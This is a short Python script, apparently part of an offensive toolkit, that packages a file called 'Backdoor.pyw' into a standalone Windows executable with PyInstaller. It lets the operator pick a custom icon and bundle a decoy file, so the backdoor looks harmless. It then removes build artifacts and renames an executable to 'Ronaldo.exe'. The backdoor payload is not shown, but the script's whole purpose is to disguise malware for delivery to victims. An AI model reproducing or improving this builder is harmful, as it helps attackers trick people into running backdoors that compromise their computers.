from time import sleep
from tkinter import Tk 
from tkinter.filedialog import askopenfilename
import os



print("""
███╗ ██████╗ ███╗    ██████╗  █████╗ ██╗   ██╗     ██████╗ ██╗   ██╗████████╗██████╗ ██╗      █████╗ ██╗   ██╗
██╔╝██╔═████╗╚██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝    ██╔═══██╗██║   ██║╚══██╔══╝██╔══██╗██║     ██╔══██╗╚██╗ ██╔╝
██║ ██║██╔██║ ██║    ██║  ██║███████║ ╚████╔╝     ██║   ██║██║   ██║   ██║   ██████╔╝██║     ███████║ ╚████╔╝ 
██║ ████╔╝██║ ██║    ██║  ██║██╔══██║  ╚██╔╝      ██║   ██║██║   ██║   ██║   ██╔═══╝ ██║     ██╔══██║  ╚██╔╝  
███╗╚██████╔╝███║    ██████╔╝██║  ██║   ██║       ╚██████╔╝╚██████╔╝   ██║   ██║     ███████╗██║  ██║   ██║   
╚══╝ ╚═════╝ ╚══╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝        ╚═════╝  ╚═════╝    ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝


                            ██████╗ ██╗   ██╗██████╗ ███████╗██╗  ██╗███████╗
                            ██╔══██╗╚██╗ ██╔╝╚════██╗██╔════╝╚██╗██╔╝██╔════╝
                            ██████╔╝ ╚████╔╝  █████╔╝█████╗   ╚███╔╝ █████╗  
                            ██╔═══╝   ╚██╔╝  ██╔═══╝ ██╔══╝   ██╔██╗ ██╔══╝  
                            ██║        ██║   ███████╗███████╗██╔╝ ██╗███████╗
                            ╚═╝        ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝
                                                 


""")

Tk().withdraw()
while 1:
    print("[+] Choose Icon for the Backdoor\n\n") 
    sleep(1)
    icon = askopenfilename(title="Choose Icon")
    if icon.split(".")[-1] != "ico":    
        print("[!] Please Choose Ico file.\n\n")
        continue
    if input("[*] Do you want to embed a file (yes/no) : ").lower() in ["y", "yes"]:
        embeded_file = askopenfilename(title="Choose File to Embed")
        os.system(f'pyinstaller --onefile -i {icon} Backdoor.pyw --add-data "{embeded_file};."')

    else:
        os.system(f'pyinstaller --onefile -i {icon} Backdoor.pyw')
    os.system("move .\\dist\\Backdoor.exe .\\") 
    os.system("rmdir /S /Q dist")
    os.system("rmdir /S /Q build")
    os.system("del Backdoor.spec")
    os.system("move Backdoor_to_exe.exe Ronaldo.exe")
    break
